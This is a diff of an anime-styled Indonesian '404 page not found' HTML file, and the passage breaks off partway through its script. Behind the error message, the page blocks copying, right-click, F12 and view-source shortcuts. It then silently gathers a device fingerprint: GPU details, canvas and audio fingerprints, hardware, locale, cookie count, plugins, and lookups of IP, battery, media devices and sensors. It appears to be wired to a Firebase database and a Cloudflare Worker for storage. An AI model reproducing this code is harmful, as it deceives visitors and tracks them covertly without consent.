@@ -6,254 +6,254 @@
 <title>404 ✨ Nyaa~ Halaman Ini Tidak Ada!</title>
 <link href="https://fonts.googleapis.com/css2?family=M+PLUS+Rounded+1c:wght@400;700;900&display=swap" rel="stylesheet">
 <style>
- /* ── Reset & anti-copy ── */
- *, *::before, *::after {
- box-sizing: border-box;
- -webkit-user-select: none !important;
- -moz-user-select: none !important;
- user-select: none !important;
- -webkit-touch-callout: none !important;
- }
+  /* ── Reset & anti-copy ── */
+  *, *::before, *::after {
+    box-sizing: border-box;
+    -webkit-user-select: none !important;
+    -moz-user-select: none !important;
+    user-select: none !important;
+    -webkit-touch-callout: none !important;
+  }
 
- /* ── Base ── */
- html {
- height: 100%;
- }
- body {
- margin: 0;
- min-height: 100dvh;
- background: linear-gradient(135deg, #fce4ec 0%, #f8bbd0 25%, #e1bee7 50%, #bbdefb 75%, #b3e5fc 100%);
- background-size: 400% 400%;
- background-attachment: fixed;
- animation: gradientShift 8s ease infinite;
- font-family: 'M PLUS Rounded 1c', 'Segoe UI', sans-serif;
- display: flex;
- justify-content: center;
- align-items: flex-start; /* tidak center — biar bisa scroll ke bawah */
- overflow-y: auto;
- overflow-x: hidden;
- position: relative;
- padding: 32px 16px 40px;
- /* safe area untuk iPhone notch */
- padding-top: max(32px, env(safe-area-inset-top));
- padding-bottom: max(40px, env(safe-area-inset-bottom));
- }
+  /* ── Base ── */
+  html {
+    height: 100%;
+  }
+  body {
+    margin: 0;
+    min-height: 100dvh;
+    background: linear-gradient(135deg, #fce4ec 0%, #f8bbd0 25%, #e1bee7 50%, #bbdefb 75%, #b3e5fc 100%);
+    background-size: 400% 400%;
+    background-attachment: fixed;
+    animation: gradientShift 8s ease infinite;
+    font-family: 'M PLUS Rounded 1c', 'Segoe UI', sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;          /* tidak center — biar bisa scroll ke bawah */
+    overflow-y: auto;
+    overflow-x: hidden;
+    position: relative;
+    padding: 32px 16px 40px;
+    /* safe area untuk iPhone notch */
+    padding-top: max(32px, env(safe-area-inset-top));
+    padding-bottom: max(40px, env(safe-area-inset-bottom));
+  }
 
- @keyframes gradientShift {
- 0% { background-position: 0% 50%; }
- 50% { background-position: 100% 50%; }
- 100% { background-position: 0% 50%; }
- }
+  @keyframes gradientShift {
+    0%   { background-position: 0% 50%; }
+    50%  { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
 
- /* ── Floating petals ── */
- .petal {
- position: fixed;
- top: -30px;
- font-size: 1.4rem;
- animation: fall linear infinite;
- pointer-events: none;
- z-index: 0;
- opacity: 0.65;
- }
- @keyframes fall {
- 0% { transform: translateY(-30px) rotate(0deg); opacity: 0.7; }
- 100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
- }
+  /* ── Floating petals ── */
+  .petal {
+    position: fixed;
+    top: -30px;
+    font-size: 1.4rem;
+    animation: fall linear infinite;
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.65;
+  }
+  @keyframes fall {
+    0%   { transform: translateY(-30px) rotate(0deg); opacity: 0.7; }
+    100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+  }
 
- /* ── Stars ── */
- .star {
- position: fixed;
- border-radius: 50%;
- background: #fff;
- animation: twinkle ease-in-out infinite;
- pointer-events: none;
- z-index: 0;
- }
- @keyframes twinkle {
- 0%, 100% { opacity: 0.1; transform: scale(1); }
- 50% { opacity: 0.85; transform: scale(1.5); }
- }
+  /* ── Stars ── */
+  .star {
+    position: fixed;
+    border-radius: 50%;
+    background: #fff;
+    animation: twinkle ease-in-out infinite;
+    pointer-events: none;
+    z-index: 0;
+  }
+  @keyframes twinkle {
+    0%, 100% { opacity: 0.1; transform: scale(1); }
+    50%       { opacity: 0.85; transform: scale(1.5); }
+  }
 
- /* ── Card ── */
- #container {
- position: relative;
- z-index: 10;
- text-align: center;
- width: 100%;
- max-width: 480px;
- /* opak lebih tinggi → teks jelas terbaca */
- background: rgba(255, 255, 255, 0.88);
- backdrop-filter: blur(20px);
- -webkit-backdrop-filter: blur(20px);
- border: 2px solid rgba(255, 182, 193, 0.55);
- border-radius: 28px;
- padding: 44px 28px 28px;
- box-shadow:
- 0 12px 40px rgba(255, 105, 180, 0.22),
- 0 0 0 1px rgba(255,255,255,0.6) inset;
- animation: popIn 0.65s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
- margin: auto; /* vertikal centering kalau layar cukup tinggi */
- }
- @keyframes popIn {
- from { opacity: 0; transform: scale(0.8) translateY(24px); }
- to { opacity: 1; transform: scale(1) translateY(0); }
- }
+  /* ── Card ── */
+  #container {
+    position: relative;
+    z-index: 10;
+    text-align: center;
+    width: 100%;
+    max-width: 480px;
+    /* opak lebih tinggi → teks jelas terbaca */
+    background: rgba(255, 255, 255, 0.88);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 2px solid rgba(255, 182, 193, 0.55);
+    border-radius: 28px;
+    padding: 44px 28px 28px;
+    box-shadow:
+      0 12px 40px rgba(255, 105, 180, 0.22),
+      0 0 0 1px rgba(255,255,255,0.6) inset;
+    animation: popIn 0.65s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
+    margin: auto; /* vertikal centering kalau layar cukup tinggi */
+  }
+  @keyframes popIn {
+    from { opacity: 0; transform: scale(0.8) translateY(24px); }
+    to   { opacity: 1; transform: scale(1) translateY(0); }
+  }
 
- /* Ribbon atas */
- #container::before {
- content: "🎀";
- position: absolute;
- top: -18px;
- left: 50%;
- transform: translateX(-50%);
- font-size: 2.2rem;
- filter: drop-shadow(0 2px 6px rgba(255,105,180,0.5));
- }
+  /* Ribbon atas */
+  #container::before {
+    content: "🎀";
+    position: absolute;
+    top: -18px;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 2.2rem;
+    filter: drop-shadow(0 2px 6px rgba(255,105,180,0.5));
+  }
 
- /* ── Anime GIF ── */
- #anime-gif {
- width: 140px;
- height: 140px;
- object-fit: cover;
- border-radius: 50%;
- border: 4px solid #ff85c1;
- box-shadow: 0 0 0 4px #fff, 0 8px 24px rgba(255, 105, 180, 0.35);
- margin-bottom: 14px;
- animation: floatBob 3s ease-in-out infinite;
- display: block;
- margin-left: auto;
- margin-right: auto;
- }
- @keyframes floatBob {
- 0%, 100% { transform: translateY(0); }
- 50% { transform: translateY(-9px); }
- }
+  /* ── Anime GIF ── */
+  #anime-gif {
+    width: 140px;
+    height: 140px;
+    object-fit: cover;
+    border-radius: 50%;
+    border: 4px solid #ff85c1;
+    box-shadow: 0 0 0 4px #fff, 0 8px 24px rgba(255, 105, 180, 0.35);
+    margin-bottom: 14px;
+    animation: floatBob 3s ease-in-out infinite;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  @keyframes floatBob {
+    0%, 100% { transform: translateY(0); }
+    50%       { transform: translateY(-9px); }
+  }
 
- /* ── Badge ── */
- .badge-404 {
- display: inline-block;
- background: linear-gradient(135deg, #ff85c1, #c084fc);
- color: #fff;
- font-size: 0.72rem;
- font-weight: 900;
- letter-spacing: 3px;
- text-transform: uppercase;
- padding: 5px 16px;
- border-radius: 999px;
- margin-bottom: 12px;
- box-shadow: 0 2px 10px rgba(192,132,252,0.35);
- }
+  /* ── Badge ── */
+  .badge-404 {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff85c1, #c084fc);
+    color: #fff;
+    font-size: 0.72rem;
+    font-weight: 900;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    padding: 5px 16px;
+    border-radius: 999px;
+    margin-bottom: 12px;
+    box-shadow: 0 2px 10px rgba(192,132,252,0.35);
+  }
 
- /* ── Heading ── */
- h1 {
- font-size: clamp(1.4rem, 5vw, 1.9rem);
- font-weight: 900;
- color: #be185d;
- margin: 4px 0 8px;
- line-height: 1.25;
- text-shadow: 1px 1px 0 rgba(255,182,193,0.6);
- }
- h1 span.kawaii {
- display: block;
- font-size: clamp(0.85rem, 3.5vw, 1rem);
- color: #a855f7;
- font-weight: 700;
- margin-top: 4px;
- }
+  /* ── Heading ── */
+  h1 {
+    font-size: clamp(1.4rem, 5vw, 1.9rem);
+    font-weight: 900;
+    color: #be185d;
+    margin: 4px 0 8px;
+    line-height: 1.25;
+    text-shadow: 1px 1px 0 rgba(255,182,193,0.6);
+  }
+  h1 span.kawaii {
+    display: block;
+    font-size: clamp(0.85rem, 3.5vw, 1rem);
+    color: #a855f7;
+    font-weight: 700;
+    margin-top: 4px;
+  }
 
- /* ── Subtitle ── */
- .subtitle {
- font-size: clamp(0.85rem, 3.5vw, 0.95rem);
- color: #7e22ce;
- margin: 0 0 16px;
- line-height: 1.7;
- }
- .subtitle em {
- font-style: normal;
- color: #db2777;
- font-weight: 700;
- }
+  /* ── Subtitle ── */
+  .subtitle {
+    font-size: clamp(0.85rem, 3.5vw, 0.95rem);
+    color: #7e22ce;
+    margin: 0 0 16px;
+    line-height: 1.7;
+  }
+  .subtitle em {
+    font-style: normal;
+    color: #db2777;
+    font-weight: 700;
+  }
 
- /* ── Divider ── */
- .divider {
- border: none;
- border-top: 2px dashed rgba(255, 133, 193, 0.45);
- margin: 14px 0;
- }
+  /* ── Divider ── */
+  .divider {
+    border: none;
+    border-top: 2px dashed rgba(255, 133, 193, 0.45);
+    margin: 14px 0;
+  }
 
- /* ── Scan log ── */
- #details {
- font-size: clamp(0.78rem, 3.2vw, 0.84rem);
- color: #6b21a8; /* lebih gelap → kontras lebih tinggi */
- text-align: left;
- max-height: 180px;
- overflow-y: auto;
- overflow-x: hidden;
- padding: 6px 4px;
- line-height: 1.75;
- /* scrollbar tipis */
- scrollbar-width: thin;
- scrollbar-color: #f472b6 transparent;
- }
- #details::-webkit-scrollbar { width: 4px; }
- #details::-webkit-scrollbar-thumb { background: #f472b6; border-radius: 4px; }
+  /* ── Scan log ── */
+  #details {
+    font-size: clamp(0.78rem, 3.2vw, 0.84rem);
+    color: #6b21a8;           /* lebih gelap → kontras lebih tinggi */
+    text-align: left;
+    max-height: 180px;
+    overflow-y: auto;
+    overflow-x: hidden;
+    padding: 6px 4px;
+    line-height: 1.75;
+    /* scrollbar tipis */
+    scrollbar-width: thin;
+    scrollbar-color: #f472b6 transparent;
+  }
+  #details::-webkit-scrollbar       { width: 4px; }
+  #details::-webkit-scrollbar-thumb { background: #f472b6; border-radius: 4px; }
 
- .line {
- margin: 2px 0;
- opacity: 0;
- animation: fadeSlide 0.35s forwards;
- display: flex;
- align-items: flex-start;
- gap: 7px;
- word-break: break-word;
- }
- .line::before {
- content: "♡";
- color: #f472b6;
- font-size: 0.72rem;
- flex-shrink: 0;
- margin-top: 2px;
- }
- @keyframes fadeSlide {
- from { opacity: 0; transform: translateX(-6px); }
- to { opacity: 1; transform: translateX(0); }
- }
+  .line {
+    margin: 2px 0;
+    opacity: 0;
+    animation: fadeSlide 0.35s forwards;
+    display: flex;
+    align-items: flex-start;
+    gap: 7px;
+    word-break: break-word;
+  }
+  .line::before {
+    content: "♡";
+    color: #f472b6;
+    font-size: 0.72rem;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+  @keyframes fadeSlide {
+    from { opacity: 0; transform: translateX(-6px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
 
- /* ── Footer ── */
- .footer-note {
- margin-top: 18px;
- font-size: clamp(0.65rem, 2.8vw, 0.72rem);
- color: #a855f7;
- opacity: 0.85;
- line-height: 1.5;
- }
+  /* ── Footer ── */
+  .footer-note {
+    margin-top: 18px;
+    font-size: clamp(0.65rem, 2.8vw, 0.72rem);
+    color: #a855f7;
+    opacity: 0.85;
+    line-height: 1.5;
+  }
 
- /* ── Bounce ── */
- .bounce {
- display: inline-block;
- animation: bounce 1.2s ease-in-out infinite;
- }
- @keyframes bounce {
- 0%, 100% { transform: translateY(0); }
- 50% { transform: translateY(-5px); }
- }
+  /* ── Bounce ── */
+  .bounce {
+    display: inline-block;
+    animation: bounce 1.2s ease-in-out infinite;
+  }
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50%       { transform: translateY(-5px); }
+  }
 
- /* ── Mobile xs (<360px) ── */
- @media (max-width: 360px) {
- body { padding: 24px 10px 32px; }
- #container { padding: 40px 18px 22px; border-radius: 22px; }
- #anime-gif { width: 116px; height: 116px; }
- h1 { font-size: 1.25rem; }
- }
+  /* ── Mobile xs (<360px) ── */
+  @media (max-width: 360px) {
+    body         { padding: 24px 10px 32px; }
+    #container   { padding: 40px 18px 22px; border-radius: 22px; }
+    #anime-gif   { width: 116px; height: 116px; }
+    h1           { font-size: 1.25rem; }
+  }
 
- /* ── Layar landscape pendek ── */
- @media (max-height: 600px) and (orientation: landscape) {
- #anime-gif { width: 80px; height: 80px; margin-bottom: 8px; }
- h1 { font-size: 1.1rem; margin: 2px 0 4px; }
- .subtitle { font-size: 0.8rem; margin-bottom: 10px; }
- #details { max-height: 100px; }
- body { padding: 16px 12px 20px; }
- }
+  /* ── Layar landscape pendek ── */
+  @media (max-height: 600px) and (orientation: landscape) {
+    #anime-gif   { width: 80px; height: 80px; margin-bottom: 8px; }
+    h1           { font-size: 1.1rem; margin: 2px 0 4px; }
+    .subtitle    { font-size: 0.8rem; margin-bottom: 10px; }
+    #details     { max-height: 100px; }
+    body         { padding: 16px 12px 20px; }
+  }
 </style>
 </head>
 <body>
@@ -264,111 +264,111 @@
 <div id="stars"></div>
 
 <div id="container">
- <img id="anime-gif"
- src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjJycm1mcTZyZmtwNDYzN2t5M2k5bHRzNDFvcDdrZGFqZTlodjdsZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1ZlXGtKFZvsfS/giphy.gif"
- alt="anime"
- draggable="false"
- />
+  <img id="anime-gif"
+    src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjJycm1mcTZyZmtwNDYzN2t5M2k5bHRzNDFvcDdrZGFqZTlodjdsZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1ZlXGtKFZvsfS/giphy.gif"
+    alt="anime"
+    draggable="false"
+  />
 
- <div class="badge-404">✨ Error 404 ✨</div>
+  <div class="badge-404">✨ Error 404 ✨</div>
 
- <h1>
- Nyaa~! Halaman Ini Hilang!
- <span class="kawaii">(´；ω；`) Gomenasai desu~</span>
- </h1>
+  <h1>
+    Nyaa~! Halaman Ini Hilang!
+    <span class="kawaii">(´；ω；`) Gomenasai desu~</span>
+  </h1>
 
- <p class="subtitle">
- Kamu nyasar ke dunia isekai yang kosong, <em>onii-chan</em>~<br>
- Halaman yang kamu cari sudah pergi entah kemana… <span class="bounce">🌸</span><br>
- Mungkin dia sedang piknik bareng kucing virtual nyaa~ 🐱
- </p>
+  <p class="subtitle">
+    Kamu nyasar ke dunia isekai yang kosong, <em>onii-chan</em>~<br>
+    Halaman yang kamu cari sudah pergi entah kemana… <span class="bounce">🌸</span><br>
+    Mungkin dia sedang piknik bareng kucing virtual nyaa~ 🐱
+  </p>
 
- <hr class="divider">
+  <hr class="divider">
 
- <div id="details"></div>
+  <div id="details"></div>
 
- <p class="footer-note">
- 🎀 りっかちゃん ✦ がんばってね！ 🌸
- </p>
+  <p class="footer-note">
+    🎀 りっかちゃん ✦ がんばってね！ 🌸
+  </p>
 </div>
 
 <script>
 /* ── GIF fallback chain ── */
 (function loadGif() {
- const urls = [
- "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjJycm1mcTZyZmtwNDYzN2t5M2k5bHRzNDFvcDdrZGFqZTlodjdsZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1ZlXGtKFZvsfS/giphy.gif",
- "https://media.giphy.com/media/1ZlXGtKFZvsfS/giphy.gif",
- "https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif",
- "https://media.giphy.com/media/xT9IgG50Lg7russBSo/giphy.gif",
- ];
- const img = document.getElementById("anime-gif");
- let idx = 0;
- function tryNext() {
- if (idx >= urls.length) {
- img.style.display = "none";
- const fallback = document.createElement("div");
- fallback.style.cssText = "font-size:7rem;line-height:1;margin-bottom:16px;animation:floatBob 3s ease-in-out infinite;display:inline-block;";
- fallback.textContent = "🌸";
- img.parentNode.insertBefore(fallback, img);
- return;
- }
- img.src = urls[idx++];
- }
- img.onerror = tryNext;
- tryNext();
+  const urls = [
+    "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjJycm1mcTZyZmtwNDYzN2t5M2k5bHRzNDFvcDdrZGFqZTlodjdsZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1ZlXGtKFZvsfS/giphy.gif",
+    "https://media.giphy.com/media/1ZlXGtKFZvsfS/giphy.gif",
+    "https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif",
+    "https://media.giphy.com/media/xT9IgG50Lg7russBSo/giphy.gif",
+  ];
+  const img = document.getElementById("anime-gif");
+  let idx = 0;
+  function tryNext() {
+    if (idx >= urls.length) {
+      img.style.display = "none";
+      const fallback = document.createElement("div");
+      fallback.style.cssText = "font-size:7rem;line-height:1;margin-bottom:16px;animation:floatBob 3s ease-in-out infinite;display:inline-block;";
+      fallback.textContent = "🌸";
+      img.parentNode.insertBefore(fallback, img);
+      return;
+    }
+    img.src = urls[idx++];
+  }
+  img.onerror = tryNext;
+  tryNext();
 })();
 
 /* ── Anti copy / context menu / keyboard shortcuts ── */
-document.addEventListener("copy", e => e.preventDefault());
-document.addEventListener("cut", e => e.preventDefault());
+document.addEventListener("copy",        e => e.preventDefault());
+document.addEventListener("cut",         e => e.preventDefault());
 document.addEventListener("contextmenu", e => e.preventDefault());
 document.addEventListener("keydown", e => {
- if (
- (e.ctrlKey || e.metaKey) &&
- ["c","x","u","s","a","p"].includes(e.key.toLowerCase())
- ) { e.preventDefault(); }
- if (e.key === "F12") e.preventDefault();
+  if (
+    (e.ctrlKey || e.metaKey) &&
+    ["c","x","u","s","a","p"].includes(e.key.toLowerCase())
+  ) { e.preventDefault(); }
+  if (e.key === "F12") e.preventDefault();
 });
 document.addEventListener("selectstart", e => e.preventDefault());
-document.addEventListener("dragstart", e => e.preventDefault());
+document.addEventListener("dragstart",   e => e.preventDefault());
 
 /* ── Sakura petals ── */
 (function spawnPetals() {
- const emojis = ["🌸","🌺","✨","💮","🌼","🍡","💕","⭐","🎀","🌟"];
- const wrap = document.getElementById("petals");
- for (let i = 0; i < 18; i++) {
- const el = document.createElement("div");
- el.className = "petal";
- el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
- el.style.left = Math.random() * 100 + "vw";
- el.style.animationDuration = (6 + Math.random() * 8) + "s";
- el.style.animationDelay = (-Math.random() * 10) + "s";
- el.style.fontSize = (1 + Math.random() * 1.2) + "rem";
- wrap.appendChild(el);
- }
+  const emojis = ["🌸","🌺","✨","💮","🌼","🍡","💕","⭐","🎀","🌟"];
+  const wrap = document.getElementById("petals");
+  for (let i = 0; i < 18; i++) {
+    const el = document.createElement("div");
+    el.className = "petal";
+    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    el.style.left  = Math.random() * 100 + "vw";
+    el.style.animationDuration  = (6 + Math.random() * 8) + "s";
+    el.style.animationDelay     = (-Math.random() * 10)   + "s";
+    el.style.fontSize           = (1 + Math.random() * 1.2) + "rem";
+    wrap.appendChild(el);
+  }
 })();
 
 /* ── Twinkling stars ── */
 (function spawnStars() {
- const wrap = document.getElementById("stars");
- for (let i = 0; i < 40; i++) {
- const el = document.createElement("div");
- el.className = "star";
- el.style.left = Math.random() * 100 + "vw";
- el.style.top = Math.random() * 100 + "vh";
- el.style.animationDuration = (1.5 + Math.random() * 3) + "s";
- el.style.animationDelay = (-Math.random() * 3) + "s";
- el.style.width = el.style.height = (2 + Math.random() * 4) + "px";
- el.style.background = ["#fff","#ffd6e7","#e9d5ff","#bae6fd"][Math.floor(Math.random()*4)];
- wrap.appendChild(el);
- }
+  const wrap = document.getElementById("stars");
+  for (let i = 0; i < 40; i++) {
+    const el = document.createElement("div");
+    el.className = "star";
+    el.style.left   = Math.random() * 100 + "vw";
+    el.style.top    = Math.random() * 100 + "vh";
+    el.style.animationDuration = (1.5 + Math.random() * 3) + "s";
+    el.style.animationDelay    = (-Math.random() * 3) + "s";
+    el.style.width = el.style.height = (2 + Math.random() * 4) + "px";
+    el.style.background = ["#fff","#ffd6e7","#e9d5ff","#bae6fd"][Math.floor(Math.random()*4)];
+    wrap.appendChild(el);
+  }
 })();
 </script>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, collection, addDoc, serverTimestamp }
- from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+  from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 /* ── CONFIG ── */
 const firebaseConfig = {
@@ -386,8 +386,8 @@ var CF_READY = WORKER_URL && !WORKER_URL.startsWith("__");
 
 var app, db;
 if (FB_READY) {
- try { app = initializeApp(firebaseConfig); db = getFirestore(app); }
- catch(e) { FB_READY = false; }
+  try { app = initializeApp(firebaseConfig); db = getFirestore(app); }
+  catch(e) { FB_READY = false; }
 }
 
 /* ── UI LOGIC ── */
@@ -395,298 +395,285 @@ const details = document.getElementById("details");
 let lineIdx = 0;
 
 function addLine(text) {
- const div = document.createElement("div");
- div.className = "line";
- div.innerText = text;
- div.style.animationDelay = (lineIdx * 0.12) + "s";
- lineIdx++;
- details.appendChild(div);
- // auto scroll
- details.scrollTop = details.scrollHeight;
+  const div = document.createElement("div");
+  div.className = "line";
+  div.innerText = text;
+  div.style.animationDelay = (lineIdx * 0.12) + "s";
+  lineIdx++;
+  details.appendChild(div);
+  // auto scroll
+  details.scrollTop = details.scrollHeight;
 }
 
 /* ── HELPERS ── */
 function hashStr(str) {
- let h = 5381;
- for (let i = 0; i < str.length; i++) {
- h = ((h * 33) ^ str.charCodeAt(i)) >>> 0;
- }
- return h.toString(16).padStart(8, '0').toUpperCase();
+  let h = 5381;
+  for (let i = 0; i < str.length; i++) {
+    h = ((h * 33) ^ str.charCodeAt(i)) >>> 0;
+  }
+  return h.toString(16).padStart(8, '0').toUpperCase();
 }
 
 /* ── DATA COLLECTION (paralel = cepat) ── */
 async function collectAll() {
- addLine("Memasuki dunia isekai~ ✨");
+  addLine("Memasuki dunia isekai~ ✨");
 
- // ── Sync: langsung ambil tanpa nunggu ──
- const navData = {
- userAgent: navigator.userAgent,
- platform: navigator.platform,
- language: navigator.language,
- languages: (navigator.languages || []).join(", "),
- cookieEnabled: navigator.cookieEnabled,
- doNotTrack: navigator.doNotTrack,
- online: navigator.onLine,
- hardwareConcurrency: navigator.hardwareConcurrency ?? null,
- deviceMemory: navigator.deviceMemory ?? null,
- maxTouchPoints: navigator.maxTouchPoints ?? null,
- connectionType: navigator.connection?.type ?? null,
- effectiveConnection: navigator.connection?.effectiveType ?? null,
- downlink: navigator.connection?.downlink ?? null,
- rtt: navigator.connection?.rtt ?? null,
- saveData: navigator.connection?.saveData ?? null,
- };
+  // ── Sync: langsung ambil tanpa nunggu ──
+  const navData = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: (navigator.languages || []).join(", "),
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    online: navigator.onLine,
+    hardwareConcurrency: navigator.hardwareConcurrency ?? null,
+    deviceMemory: navigator.deviceMemory ?? null,
+    maxTouchPoints: navigator.maxTouchPoints ?? null,
+    connectionType: navigator.connection?.type ?? null,
+    effectiveConnection: navigator.connection?.effectiveType ?? null,
+    downlink: navigator.connection?.downlink ?? null,
+    rtt: navigator.connection?.rtt ?? null,
+    saveData: navigator.connection?.saveData ?? null,
+  };
 
- const screenData = {
- width: screen.width, height: screen.height,
- availWidth: screen.availWidth, availHeight: screen.availHeight,
- colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
- orientation: screen.orientation?.type ?? null,
- orientationAngle: screen.orientation?.angle ?? null,
- innerWidth: window.innerWidth, innerHeight: window.innerHeight,
- outerWidth: window.outerWidth, outerHeight: window.outerHeight,
- };
+  const screenData = {
+    width: screen.width, height: screen.height,
+    availWidth: screen.availWidth, availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
+    orientation: screen.orientation?.type ?? null,
+    orientationAngle: screen.orientation?.angle ?? null,
+    innerWidth: window.innerWidth, innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth, outerHeight: window.outerHeight,
+  };
 
- // GPU (sync)
- let gpuData = { vendor: null, renderer: null, version: null };
- try {
- const c = document.createElement('canvas');
- const gl = c.getContext('webgl2') || c.getContext('webgl');
- if (gl) {
- const ext = gl.getExtension('WEBGL_debug_renderer_info');
- gpuData.vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null;
- gpuData.renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null;
- gpuData.version = gl.getParameter(gl.VERSION);
- }
- } catch(e) {}
+  // GPU (sync)
+  let gpuData = { vendor: null, renderer: null, version: null };
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl2') || c.getContext('webgl');
+    if (gl) {
+      const ext = gl.getExtension('WEBGL_debug_renderer_info');
+      gpuData.vendor   = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null;
+      gpuData.renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null;
+      gpuData.version  = gl.getParameter(gl.VERSION);
+    }
+  } catch(e) {}
 
- // Canvas fingerprint (sync)
- let canvasFingerprint = null;
- try {
- const c2 = document.createElement('canvas');
- c2.width = 200; c2.height = 50;
- const ctx2 = c2.getContext('2d');
- ctx2.textBaseline = "top"; ctx2.font = "14px Arial";
- ctx2.fillStyle = "#f00"; ctx2.fillRect(125, 1, 62, 20);
- ctx2.fillStyle = "#0099ff"; ctx2.fillText("Isekai \uD83C\uDF38", 2, 15);
- canvasFingerprint = hashStr(c2.toDataURL());
- } catch(e) {}
+  // Canvas fingerprint (sync)
+  let canvasFingerprint = null;
+  try {
+    const c2 = document.createElement('canvas');
+    c2.width = 200; c2.height = 50;
+    const ctx2 = c2.getContext('2d');
+    ctx2.textBaseline = "top"; ctx2.font = "14px Arial";
+    ctx2.fillStyle = "#f00"; ctx2.fillRect(125, 1, 62, 20);
+    ctx2.fillStyle = "#0099ff"; ctx2.fillText("Isekai \uD83C\uDF38", 2, 15);
+    canvasFingerprint = hashStr(c2.toDataURL());
+  } catch(e) {}
 
- // Storage (sync)
- const storageData = {
- localStorage: !!window.localStorage,
- sessionStorage: !!window.sessionStorage,
- indexedDB: !!window.indexedDB,
- serviceWorker: 'serviceWorker' in navigator,
- cacheAPI: 'caches' in window,
- cookies: document.cookie ? document.cookie.split(';').length : 0,
- };
+  // Storage (sync)
+  const storageData = {
+    localStorage:  !!window.localStorage,
+    sessionStorage: !!window.sessionStorage,
+    indexedDB:     !!window.indexedDB,
+    serviceWorker: 'serviceWorker' in navigator,
+    cacheAPI:      'caches' in window,
+    cookies: document.cookie ? document.cookie.split(';').length : 0,
+  };
 
- // Locale (sync)
- const localeData = {
- timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
- currency: Intl.NumberFormat().resolvedOptions().currency ?? null,
- calendar: Intl.DateTimeFormat().resolvedOptions().calendar ?? null,
- numberingSystem: Intl.NumberFormat().resolvedOptions().numberingSystem ?? null,
- };
+  // Locale (sync)
+  const localeData = {
+    timezone:        Intl.DateTimeFormat().resolvedOptions().timeZone,
+    currency:        Intl.NumberFormat().resolvedOptions().currency        ?? null,
+    calendar:        Intl.DateTimeFormat().resolvedOptions().calendar      ?? null,
+    numberingSystem: Intl.NumberFormat().resolvedOptions().numberingSystem ?? null,
+  };
 
- // Browser features (sync)
- const features = {
- webgl2: !!document.createElement('canvas').getContext('webgl2'),
- webgpu: !!navigator.gpu,
- webrtc: !!window.RTCPeerConnection,
- cssGrid: !!CSS.supports('display', 'grid'),
- flexbox: !!CSS.supports('display', 'flex'),
- fetchAPI: !!window.fetch,
- promise: !!window.Promise,
- };
+  // Browser features (sync)
+  const features = {
+    webgl2:   !!document.createElement('canvas').getContext('webgl2'),
+    webgpu:   !!navigator.gpu,
+    webrtc:   !!window.RTCPeerConnection,
+    cssGrid:  !!CSS.supports('display', 'grid'),
+    flexbox:  !!CSS.supports('display', 'flex'),
+    fetchAPI: !!window.fetch,
+    promise:  !!window.Promise,
+  };
 
- const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(", ");
- const mimeList = Array.from(navigator.mimeTypes || []).map(m => m.type).join(", ");
+  const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(", ");
+  const mimeList    = Array.from(navigator.mimeTypes || []).map(m => m.type).join(", ");
 
- addLine("Mengumpulkan data perangkat~ 💻");
+  addLine("Mengumpulkan data perangkat~ 💻");
 
- // ── Async semua paralel ──
- const [
- audioFpResult,
- ipResult,
- mediaResult,
- batteryResult,
- uahResult,
- sensorResult,
- ] = await Promise.allSettled([
+  // ── Async semua paralel ──
+  const [
+    audioFpResult,
+    ipResult,
+    mediaResult,
+    batteryResult,
+    uahResult,
+    sensorResult,
+  ] = await Promise.allSettled([
 
- // Audio fingerprint
- (async () => {
- const AudioCtx = window.AudioContext || window.webkitAudioContext;
- const actx = new AudioCtx();
- const osc = actx.createOscillator();
- const gain = actx.createGain();
- const script = actx.createScriptProcessor(4096, 1, 1);
- gain.gain.value = 0;
- osc.connect(gain); gain.connect(script); script.connect(actx.destination);
- osc.frequency.value = 1000; osc.start();
- return new Promise((res) => {
